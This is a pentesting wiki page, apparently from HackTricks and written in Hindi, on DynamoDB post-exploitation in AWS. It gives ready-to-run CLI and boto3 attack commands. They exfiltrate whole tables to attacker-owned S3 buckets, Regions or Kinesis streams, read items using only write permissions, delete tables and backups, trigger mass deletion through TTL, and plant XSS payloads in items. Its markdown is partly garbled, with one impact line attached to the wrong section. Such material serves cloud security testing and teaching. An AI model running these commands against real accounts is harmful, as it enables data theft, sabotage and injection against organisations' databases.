# AWS - DynamoDB Post Exploitation

{{#include ../../../../banners/hacktricks-training.md}}

## DynamoDB

अधिक जानकारी के लिए देखें:

{{#ref}}
../../aws-services/aws-dynamodb-enum.md
{{#endref}}

### `dynamodb:BatchGetItem`

इस अनुमति के साथ attacker टेबलों से प्राथमिक कुंजी द्वारा **आइटम प्राप्त कर सकेगा** (आप सिर्फ तालिका के सभी डेटा की माँग नहीं कर सकते)। इसका मतलब है कि आपको प्राथमिक कुंजियाँ पता होनी चाहिए (आप यह तालिका के मेटाडाटा प्राप्त करके पा सकते हैं (`describe-table`)).

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb batch-get-item --request-items file:///tmp/a.json

// With a.json
{
"ProductCatalog" : { // This is the table name
"Keys": [
{
"Id" : { // Primary keys name
"N": "205" // Value to search for, you could put here entries from 1 to 1000 to dump all those
}
}
]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb batch-get-item \
--request-items '{"TargetTable": {"Keys": [{"Id": {"S": "item1"}}, {"Id": {"S": "item2"}}]}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**संभावित प्रभाव:** टेबल में संवेदनशील जानकारी का पता लगाकर Indirect privesc

### `dynamodb:GetItem`

**पिछली अनुमतियों के समान** यह अनुमति एक संभावित attacker को केवल 1 टेबल से एंट्री की प्राथमिक कुंजी देकर मान पढ़ने की अनुमति देती है:
```json
aws dynamodb get-item --table-name ProductCatalog --key  file:///tmp/a.json

// With a.json
{
"Id" : {
"N": "205"
}
}
```
इस अनुमति के साथ यह भी संभव है कि आप **`transact-get-items`** मेथड का उपयोग इस तरह कर सकते हैं:
```json
aws dynamodb transact-get-items \
--transact-items file:///tmp/a.json

// With a.json
[
{
"Get": {
"Key": {
"Id": {"N": "205"}
},
"TableName": "ProductCatalog"
}
}
]
```
**संभावित प्रभाव:** टेबल में संवेदनशील जानकारी का पता लगाकर अप्रत्यक्ष privesc

### `dynamodb:Query`

**पिछली permissions के समान** यह एक संभावित attacker को केवल 1 तालिका से उस एंट्री की प्राथमिक कुंजी दिए जाने पर मान पढ़ने की अनुमति देता है। यह [subset of comparisons](https://docs.aws.amazon.com/amazondynamodb/latest/APIReference/API_Condition.html) का उपयोग करने की अनुमति देता है, लेकिन प्राथमिक कुंजी (जो मौजूद होना चाहिए) के साथ केवल "EQ" तुलना की अनुमति है, इसलिए आप किसी request में पूरे DB को प्राप्त करने के लिए तुलना का उपयोग नहीं कर सकते।

{{#tabs }}
{{#tab name="json file" }}
```bash
aws dynamodb query --table-name ProductCatalog --key-conditions file:///tmp/a.json

// With a.json
{
"Id" : {
"ComparisonOperator":"EQ",
"AttributeValueList": [ {"N": "205"} ]
}
}
```
{{#endtab }}

{{#tab name="inline" }}
```bash
aws dynamodb query \
--table-name TargetTable \
--key-condition-expression "AttributeName = :value" \
--expression-attribute-values '{":value":{"S":"TargetValue"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** Indirect privesc द्वारा टेबल में संवेदनशील जानकारी का पता लगाना

### `dynamodb:Scan`

आप इस अनुमति का उपयोग करके **पूरी टेबल को आसानी से dump कर सकते हैं**।
```bash
aws dynamodb scan --table-name <t_name> #Get data inside the table
```
**संभावित प्रभाव:** Indirect privesc द्वारा तालिका में संवेदनशील जानकारी का पता लगाकर

### `dynamodb:PartiQLSelect`

आप इस अनुमति का उपयोग **पूरी तालिका को आसानी से dump करने** के लिए कर सकते हैं।
```bash
aws dynamodb execute-statement \
--statement "SELECT * FROM ProductCatalog"
```
यह अनुमति `batch-execute-statement` जैसे कार्यों को करने की भी अनुमति देती है:
```bash
aws dynamodb batch-execute-statement \
--statements '[{"Statement": "SELECT * FROM ProductCatalog WHERE Id = 204"}]'
```
हालाँकि आपको प्राथमिक कुंजी के साथ एक मान निर्दिष्ट करना होगा, इसलिए यह इतना उपयोगी नहीं है।

**Potential Impact:** टेबल में संवेदनशील जानकारी का पता लगाकर अप्रत्यक्ष privesc

### `dynamodb:ExportTableToPointInTime|(dynamodb:UpdateContinuousBackups)`

यह अनुमति attacker को **पूरे टेबल को अपनी पसंद के S3 bucket में निर्यात** करने की अनुमति देगी:
```bash
aws dynamodb export-table-to-point-in-time \
--table-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable \
--s3-bucket <attacker_s3_bucket> \
--s3-prefix <optional_prefix> \
--export-time <point_in_time> \
--region <region>
```
ध्यान दें कि इसके काम करने के लिए टेबल में point-in-time-recovery सक्षम होना चाहिए, आप यह जाँच सकते हैं कि टेबल में यह है या नहीं:
```bash
aws dynamodb describe-continuous-backups \
--table-name <tablename>
```
यदि यह सक्षम नहीं है, तो आपको इसे **सक्षम करना** होगा और उसके लिए आपको **`dynamodb:ExportTableToPointInTime`** अनुमति की आवश्यकता होगी:
```bash
aws dynamodb update-continuous-backups \
--table-name <value> \
--point-in-time-recovery-specification PointInTimeRecoveryEnabled=true
```
**संभावित प्रभाव:** अप्रत्यक्ष privesc — टेबल में संवेदनशील जानकारी खोजकर

### `dynamodb:CreateTable`, `dynamodb:RestoreTableFromBackup`, (`dynamodb:CreateBackup)`

इन permissions के साथ, एक attacker सक्षम होगा **बैकअप से एक नया टेबल बनाने में** (या यहाँ तक कि एक बैकअप बनाकर उसे दूसरे टेबल में restore करने के लिए)। फिर, आवश्यक permissions के साथ, वह बैकअप से **जानकारी** देख पाएगा जो c**अब production में मौजूद नहीं होगी** टेबल।
```bash
aws dynamodb restore-table-from-backup \
--backup-arn <source-backup-arn> \
--target-table-name <new-table-name> \
--region <region>
```
**Potential Impact:** टेबल बैकअप में संवेदनशील जानकारी का पता लगाकर अप्रत्यक्ष privesc

### `dynamodb:PutItem`

यह अनुमति उपयोगकर्ताओं को टेबल में **नया आइटम जोड़ने या मौजूदा आइटम को नए आइटम से बदलने** की अनुमति देती है। यदि उसी प्राथमिक कुंजी का एक आइटम पहले से मौजूद है, तो **पूरा आइटम नए आइटम से प्रतिस्थापित कर दिया जाएगा**। यदि प्राथमिक कुंजी मौजूद नहीं है, तो निर्दिष्ट प्राथमिक कुंजी के साथ एक नया आइटम **निर्मित किया जाएगा**।

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Create new item with XSS payload
aws dynamodb put-item --table <table_name> --item file://add.json
### With add.json:
{
"Id": {
"S": "1000"
},
"Name": {
"S":  "Marc"
},
"Description": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb put-item \
--table-name ExampleTable \
--item '{"Id": {"S": "1"}, "Attribute1": {"S": "Value1"}, "Attribute2": {"S": "Value2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**Potential Impact:** DynamoDB table में डेटा जोड़ने/संशोधित करने में सक्षम होने पर आगे की vulnerabilities/bypasses का exploitation

### `dynamodb:UpdateItem`

यह अनुमति उपयोगकर्ताओं को किसी आइटम के मौजूदा attributes को **संशोधित करने** या आइटम में नए attributes **जोड़ने** की अनुमति देती है। यह पूरे आइटम को **बदलता नहीं है**; यह केवल निर्दिष्ट attributes को ही अपडेट करता है। यदि तालिका में प्राथमिक कुंजी मौजूद नहीं है, तो यह ऑपरेशन निर्दिष्ट primary key के साथ एक **नया आइटम बनाएगा** और update expression में निर्दिष्ट attributes सेट करेगा।

{{#tabs }}
{{#tab name="XSS Example" }}
```bash
## Update item with XSS payload
aws dynamodb update-item --table <table_name> \
--key file://key.json --update-expression "SET Description = :value" \
--expression-attribute-values file://val.json
### With key.json:
{
"Id": {
"S": "1000"
}
}
### and val.json
{
":value": {
"S": "<script>alert(1)</script>"
}
}
```
{{#endtab }}

{{#tab name="AI Example" }}
```bash
aws dynamodb update-item \
--table-name ExampleTable \
--key '{"Id": {"S": "1"}}' \
--update-expression "SET Attribute1 = :val1, Attribute2 = :val2" \
--expression-attribute-values '{":val1": {"S": "NewValue1"}, ":val2": {"S": "NewValue2"}}' \
--region <region>
```
{{#endtab }}
{{#endtabs }}

**संभावित प्रभाव:** DynamoDB table में डेटा जोड़ने/संशोधित करने में सक्षम होने से आगे के vulnerabilities/bypasses का शोषण संभव है।

### `dynamodb:DeleteTable`

इस permission वाले attacker एक DynamoDB table को **हटा सकते हैं, जिससे डेटा हानि हो सकती है।**
```bash
aws dynamodb delete-table \
--table-name TargetTable \
--region <region>
```
**संभावित प्रभाव**: डेटा हानि और हटाई गई तालिका पर निर्भर सेवाओं में व्यवधान।

### `dynamodb:DeleteBackup`

इस अनुमति वाला हमलावर **DynamoDB बैकअप को हटा सकता है, जो आपदा पुनर्प्राप्ति के परिदृश्य में संभावित रूप से डेटा हानि का कारण बन सकता है**।
```bash
aws dynamodb delete-backup \
--backup-arn arn:aws:dynamodb:<region>:<account-id>:table/TargetTable/backup/BACKUP_ID \
--region <region>
```
**संभावित प्रभाव**: डेटा हानि और आपदा पुनर्प्राप्ति स्थिति में बैकअप से पुनर्प्राप्ति में असमर्थता।

### `dynamodb:StreamSpecification`, `dynamodb:UpdateTable`, `dynamodb:DescribeStream`, `dynamodb:GetShardIterator`, `dynamodb:GetRecords`

> [!NOTE]
> TODO: परीक्षण करें कि यह वास्तव में काम करता है

इन permissions के साथ एक attacker **किसी DynamoDB table पर stream सक्षम कर सकता है, table को अपडेट करके परिवर्तन स्ट्रीमिंग शुरू कर सकता है, और फिर stream तक पहुंचकर वास्तविक समय में table में होने वाले परिवर्तनों की मॉनिटरिंग कर सकता है**। यह attacker को परिवर्तन मॉनिटर और exfiltrate करने की अनुमति देता है, जो संभावित रूप से data leakage का कारण बन सकता है।

1. किसी DynamoDB टेबल पर stream सक्षम करें:
```bash
aws dynamodb update-table \
--table-name TargetTable \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES \
--region <region>
```
2. उस stream का वर्णन करें ताकि ARN और अन्य विवरण प्राप्त किए जा सकें:
```bash
aws dynamodb describe-stream \
--table-name TargetTable \
--region <region>
```
3. shard iterator प्राप्त करें stream ARN का उपयोग करके:
```bash
aws dynamodbstreams get-shard-iterator \
--stream-arn <stream_arn> \
--shard-id <shard_id> \
--shard-iterator-type LATEST \
--region <region>
```
4. shard iterator का उपयोग करके stream से डेटा एक्सेस और exfiltrate करें:
```bash
aws dynamodbstreams get-records \
--shard-iterator <shard_iterator> \
--region <region>
```
**संभावित प्रभाव**: Real-time monitoring and data leakage of the DynamoDB table's changes.

### आइटम पढ़ें `dynamodb:UpdateItem` और `ReturnValues=ALL_OLD` के ज़रिए

सिर्फ़ `dynamodb:UpdateItem` अनुमतियाँ वाली किसी attacker को टेबल पर सामान्य read permissions (`GetItem`/`Query`/`Scan`) के बिना भी आइटम पढ़ने की क्षमता मिल सकती है — वह एक harmless update करके और `--return-values ALL_OLD` माँगकर ऐसा कर सकता है। DynamoDB response के `Attributes` फ़ील्ड में आइटम की पूरी pre-update image लौटाएगा (यह RCUs खर्च नहीं करता)।

- न्यूनतम अनुमतियाँ: लक्ष्य table/key पर `dynamodb:UpdateItem`.
- पूर्वापेक्षाएँ: आपको आइटम की प्राथमिक कुंजी (primary key) पता होनी चाहिए।

Example (एक harmless attribute जोड़ता है और response में previous item को exfiltrates करता है):
```bash
aws dynamodb update-item \
--table-name <TargetTable> \
--key '{"<PKName>":{"S":"<PKValue>"}}' \
--update-expression 'SET #m = :v' \
--expression-attribute-names '{"#m":"exfil_marker"}' \
--expression-attribute-values '{":v":{"S":"1"}}' \
--return-values ALL_OLD \
--region <region>
```
CLI प्रतिक्रिया में एक `Attributes` ब्लॉक शामिल होगा जो पिछले आइटम की पूरी सामग्री (सभी attributes) रखेगा, जिससे write-only एक्सेस से प्रभावी रूप से एक read primitive मिल जाता है।

**Potential Impact:** केवल write permissions होने पर किसी table से मनमाने आइटम पढ़ना संभव, जब primary keys ज्ञात हों तो संवेदनशील डेटा की exfiltration सक्षम हो जाता है।


### `dynamodb:UpdateTable (replica-updates)` | `dynamodb:CreateTableReplica`

DynamoDB Global Table (version 2019.11.21) में एक नया replica Region जोड़कर छुपकर exfiltration। अगर कोई principal regional replica जोड़ सकता है, तो पूरा table attacker-चुने Region में replicate हो जाता है, जहाँ से attacker सभी आइटम पढ़ सकता है।

{{#tabs }}
{{#tab name="PoC (default DynamoDB-managed KMS)" }}
```bash
# Add a new replica Region (from primary Region)
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>"}}]' \
--region <primary-region>

# Wait until the replica table becomes ACTIVE in the replica Region
aws dynamodb describe-table --table-name <TableName> --region <replica-region> --query 'Table.TableStatus'

# Exfiltrate by reading from the replica Region
aws dynamodb scan --table-name <TableName> --region <replica-region>
```
{{#endtab }}
{{#tab name="PoC (customer-managed KMS)" }}
```bash
# Specify the CMK to use in the replica Region
aws dynamodb update-table \
--table-name <TableName> \
--replica-updates '[{"Create": {"RegionName": "<replica-region>", "KMSMasterKeyId": "arn:aws:kms:<replica-region>:<account-id>:key/<cmk-id>"}}]' \
--region <primary-region>
```
{{#endtab }}
{{#endtabs }}

अनुमतियाँ: `dynamodb:UpdateTable` (with `replica-updates`) या लक्षित तालिका पर `dynamodb:CreateTableReplica`। यदि replica में CMK का उपयोग किया गया है, तो उस कुंजी के लिए KMS अनुमतियाँ आवश्यक हो सकती हैं।

संभावित प्रभाव: हमलावर-नियंत्रित Region में पूरी तालिका की replication, जिससे गुप्त तरीके से डेटा exfiltration संभव हो सकता है।

### `dynamodb:TransactWriteItems` (असफल condition के माध्यम से पढ़ना + `ReturnValuesOnConditionCheckFailure=ALL_OLD`)

ट्रांज़ैक्शनल write अधिकार वाला कोई हमलावर `TransactWriteItems` के अंदर एक जानबूझकर असफल होने वाला `Update` करके किसी मौजूदा आइटम के पूरे attributes exfiltrate कर सकता है, जबकि `ReturnValuesOnConditionCheckFailure=ALL_OLD` सेट किया गया हो। असफलता पर, DynamoDB लेन-देन रद्द करने के कारणों में पिछले attributes शामिल कर देता है, प्रभावी रूप से लक्षित keys के लिए केवल-write पहुँच को पढ़ने की पहुँच में बदल देता है।

{{#tabs }}
{{#tab name="PoC (AWS CLI >= supports cancellation reasons)" }}
```bash
# Create the transaction input (list form for --transact-items)
cat > /tmp/tx_items.json << 'JSON'
[
{
"Update": {
"TableName": "<TableName>",
"Key": {"<PKName>": {"S": "<PKValue>"}},
"UpdateExpression": "SET #m = :v",
"ExpressionAttributeNames": {"#m": "marker"},
"ExpressionAttributeValues": {":v": {"S": "x"}},
"ConditionExpression": "attribute_not_exists(<PKName>)",
"ReturnValuesOnConditionCheckFailure": "ALL_OLD"
}
}
]
JSON

# Execute. Newer AWS CLI versions support returning cancellation reasons
aws dynamodb transact-write-items \
--transact-items file:///tmp/tx_items.json \
--region <region> \
--return-cancellation-reasons
# The command fails with TransactionCanceledException; parse cancellationReasons[0].Item
```
{{#endtab }}
{{#tab name="PoC (boto3)" }}
```python
import boto3
c=boto3.client('dynamodb',region_name='<region>')
try:
c.transact_write_items(TransactItems=[{ 'Update': {
'TableName':'<TableName>',
'Key':{'<PKName>':{'S':'<PKValue>'}},
'UpdateExpression':'SET #m = :v',
'ExpressionAttributeNames':{'#m':'marker'},
'ExpressionAttributeValues':{':v':{'S':'x'}},
'ConditionExpression':'attribute_not_exists(<PKName>)',
'ReturnValuesOnConditionCheckFailure':'ALL_OLD'}}])
except c.exceptions.TransactionCanceledException as e:
print(e.response['CancellationReasons'][0]['Item'])
```
{{#endtab }}
{{#endtabs }}

अनुमतियाँ: `dynamodb:TransactWriteItems` on the target table (और अंतर्निहित आइटम)। किसी भी पढ़ने की अनुमतियों की आवश्यकता नहीं है।

संभावित प्रभाव: केवल ट्रांज़ैक्शनल write विशेषाधिकारों का उपयोग करके, वापस किए गए रद्द करने के कारणों के माध्यम से प्राथमिक कुंजी द्वारा तालिका से किसी भी आइटम को पढ़ना।

### `dynamodb:UpdateTable` + `dynamodb:UpdateItem` + `dynamodb:Query` on GSI

कम-एंट्रॉपी attribute पर `ProjectionType=ALL` के साथ एक Global Secondary Index (GSI) बनाकर पढ़ने पर लगे प्रतिबंधों को बायपास करें, उस attribute को सभी आइटम्स पर एक स्थिर मान पर सेट करें, फिर पूर्ण आइटम प्राप्त करने के लिए index को `Query` करें। यह तब भी काम करता है जब base table पर `Query`/`Scan` इनकार कर दिए गए हों, बशर्ते आप index ARN को query कर सकें।

- न्यूनतम अनुमतियाँ:
- `dynamodb:UpdateTable` on the target table (to create the GSI with `ProjectionType=ALL`).
- `dynamodb:UpdateItem` on the target table keys (to set the indexed attribute on each item).
- `dynamodb:Query` on the index resource ARN (`arn:aws:dynamodb:<region>:<account-id>:table/<TableName>/index/<IndexName>`).

चरण (PoC in us-east-1):
```bash
# 1) Create table and seed items (without the future GSI attribute)
aws dynamodb create-table --table-name HTXIdx \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXIdx --region us-east-1
for i in 1 2 3 4 5; do \
aws dynamodb put-item --table-name HTXIdx \
--item "{\"id\":{\"S\":\"$i\"},\"secret\":{\"S\":\"sec-$i\"}}" \
--region us-east-1; done

# 2) Add GSI on attribute X with ProjectionType=ALL
aws dynamodb update-table --table-name HTXIdx \
--attribute-definitions AttributeName=X,AttributeType=S \
--global-secondary-index-updates '[{"Create":{"IndexName":"ExfilIndex","KeySchema":[{"AttributeName":"X","KeyType":"HASH"}],"Projection":{"ProjectionType":"ALL"}}}]' \
--region us-east-1
# Wait for index to become ACTIVE
aws dynamodb describe-table --table-name HTXIdx --region us-east-1 \
--query 'Table.GlobalSecondaryIndexes[?IndexName==`ExfilIndex`].IndexStatus'

# 3) Set X="dump" for each item (only UpdateItem on known keys)
for i in 1 2 3 4 5; do \
aws dynamodb update-item --table-name HTXIdx \
--key "{\"id\":{\"S\":\"$i\"}}" \
--update-expression 'SET #x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1; done

# 4) Query the index by the constant value to retrieve full items
aws dynamodb query --table-name HTXIdx --index-name ExfilIndex \
--key-condition-expression '#x = :v' \
--expression-attribute-names '{"#x":"X"}' \
--expression-attribute-values '{":v":{"S":"dump"}}' \
--region us-east-1
```
**संभावित प्रभाव:** नए बने GSI को query करके, जो सभी attributes को project करता है, पूरा table exfiltration किया जा सकता है — यहाँ तक कि base table read APIs deny होने पर भी।


### `dynamodb:EnableKinesisStreamingDestination` (निरंतर exfiltration via Kinesis Data Streams)

DynamoDB Kinesis streaming destinations का दुरुपयोग करके टेबल के परिवर्तनों को लगातार attacker-controlled Kinesis Data Stream में exfiltrate किया जा सकता है। एक बार enabled होने पर, हर INSERT/MODIFY/REMOVE event लगभग real-time में stream को forward किया जाता है, बिना table पर read permissions की आवश्यकता के।

Minimum permissions (attacker):
- `dynamodb:EnableKinesisStreamingDestination` target table पर
- वैकल्पिक रूप से `dynamodb:DescribeKinesisStreamingDestination`/`dynamodb:DescribeTable` status मॉनिटर करने के लिए
- attacker-owned Kinesis stream पर records consume करने के लिए Read permissions: `kinesis:*`

<details>
<summary>PoC (us-east-1)</summary>
```bash
# 1) Prepare: create a table and seed one item
aws dynamodb create-table --table-name HTXKStream \
--attribute-definitions AttributeName=id,AttributeType=S \
--key-schema AttributeName=id,KeyType=HASH \
--billing-mode PAY_PER_REQUEST --region us-east-1
aws dynamodb wait table-exists --table-name HTXKStream --region us-east-1
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item1.json --region us-east-1
# /tmp/htx_item1.json
# {"id":{"S":"a1"},"secret":{"S":"s-1"}}

# 2) Create attacker Kinesis Data Stream
aws kinesis create-stream --stream-name htx-ddb-exfil --shard-count 1 --region us-east-1
aws kinesis wait stream-exists --stream-name htx-ddb-exfil --region us-east-1

# 3) Enable the DynamoDB -> Kinesis streaming destination
STREAM_ARN=$(aws kinesis describe-stream-summary --stream-name htx-ddb-exfil \
--region us-east-1 --query StreamDescriptionSummary.StreamARN --output text)
aws dynamodb enable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1
# Optionally wait until ACTIVE
aws dynamodb describe-kinesis-streaming-destination --table-name HTXKStream \
--region us-east-1 --query KinesisDataStreamDestinations[0].DestinationStatus

# 4) Generate changes on the table
aws dynamodb put-item --table-name HTXKStream \
--item file:///tmp/htx_item2.json --region us-east-1
# /tmp/htx_item2.json
# {"id":{"S":"a2"},"secret":{"S":"s-2"}}
aws dynamodb update-item --table-name HTXKStream \
--key file:///tmp/htx_key_a1.json \
--update-expression "SET #i = :v" \
--expression-attribute-names {#i:info} \
--expression-attribute-values {:v:{S:updated}} \
--region us-east-1
# /tmp/htx_key_a1.json -> {"id":{"S":"a1"}}

# 5) Consume from Kinesis to observe DynamoDB images
SHARD=$(aws kinesis list-shards --stream-name htx-ddb-exfil --region us-east-1 \
--query Shards[0].ShardId --output text)
IT=$(aws kinesis get-shard-iterator --stream-name htx-ddb-exfil --shard-id "$SHARD" \
--shard-iterator-type TRIM_HORIZON --region us-east-1 --query ShardIterator --output text)
aws kinesis get-records --shard-iterator "$IT" --limit 10 --region us-east-1 > /tmp/krec.json
# Decode one record (Data is base64-encoded)
jq -r .Records[0].Data /tmp/krec.json | base64 --decode | jq .

# 6) Cleanup (recommended)
aws dynamodb disable-kinesis-streaming-destination \
--table-name HTXKStream --stream-arn "$STREAM_ARN" --region us-east-1 || true
aws kinesis delete-stream --stream-name htx-ddb-exfil --enforce-consumer-deletion --region us-east-1 || true
aws dynamodb delete-table --table-name HTXKStream --region us-east-1 || true
```
### `dynamodb:UpdateTimeToLive`

dynamodb:UpdateTimeToLive अनुमति वाले एक हमलावर एक table की TTL (time-to-live) कॉन्फ़िगरेशन को बदल सकते हैं — TTL को सक्षम या अक्षम कर सकते हैं। जब TTL सक्षम होता है, तो वे व्यक्तिगत items जिनमें कॉन्फ़िगर किया गया TTL attribute होता है, उनके समाप्ति समय पहुँचने पर स्वचालित रूप से हटाए दिए जाएंगे। TTL value प्रत्येक आइटम पर एक और attribute होती है; जिन items में वह attribute नहीं है, वे TTL-आधारित हटाने से प्रभावित नहीं होते।

यदि items पहले से TTL attribute नहीं रखते हैं, तो हमलावर को उन items को अपडेट करने की अनुमति भी चाहिए होगी (उदाहरण के लिए dynamodb:UpdateItem) ताकि वह TTL attribute जोड़कर बड़े पैमाने पर deletions को ट्रिगर कर सके।

सबसे पहले table पर TTL सक्षम करें, और expiration के लिए उपयोग होने वाले attribute का नाम निर्दिष्ट करें:
```bash
aws dynamodb update-time-to-live \
--table-name <TABLE_NAME> \
--time-to-live-specification "Enabled=true, AttributeName=<TTL_ATTRIBUTE_NAME>"
```
फिर items को अपडेट करके TTL attribute (epoch seconds) जोड़ें ताकि वे समाप्त होकर हटा दिए जाएँ:
```bash
aws dynamodb update-item \
--table-name <TABLE_NAME> \
--key '<PRIMARY_KEY_JSON>' \
--update-expression "SET <TTL_ATTRIBUTE_NAME> = :t" \
--expression-attribute-values '{":t":{"N":"<EPOCH_SECONDS_VALUE>"}}'
```
### `dynamodb:RestoreTableFromAwsBackup` & `dynamodb:RestoreTableToPointInTime`

यदि किसी हमलावर के पास dynamodb:RestoreTableFromAwsBackup या dynamodb:RestoreTableToPointInTime permissions हों, तो वह backups या point-in-time recovery (PITR) से restored नई tables बना सकता है बिना मूल table को overwrite किए। Restored table में चयनित पॉइंट का डेटा का पूरा चित्र होता है, इसलिए हमलावर इसका उपयोग ऐतिहासिक जानकारी exfiltrate करने या डेटाबेस की पिछली स्थिति का पूरा dump प्राप्त करने के लिए कर सकता है।

on-demand बैकअप से एक DynamoDB table पुनर्स्थापित करें:
```bash
aws dynamodb restore-table-from-backup \
--target-table-name <NEW_TABLE_NAME> \
--backup-arn <BACKUP_ARN>
```
DynamoDB तालिका को किसी समय-बिंदु पर पुनर्स्थापित करें (पुनर्स्थापित स्थिति के साथ एक नई तालिका बनाएं):
```bash
aws dynamodb restore-table-to-point-in-time \
--source-table-name <SOURCE_TABLE_NAME> \
--target-table-name <NEW_TABLE_NAME> \
--use-latest-restorable-time
````
</details>

**संभावित प्रभाव:** टेबल परिवर्तनों का निरंतर, लगभग वास्तविक-समय में हमलावर-नियंत्रित Kinesis stream पर निकासी, बिना टेबल पर प्रत्यक्ष read ऑपरेशन्स के।

{{#include ../../../../banners/hacktricks-training.md}}
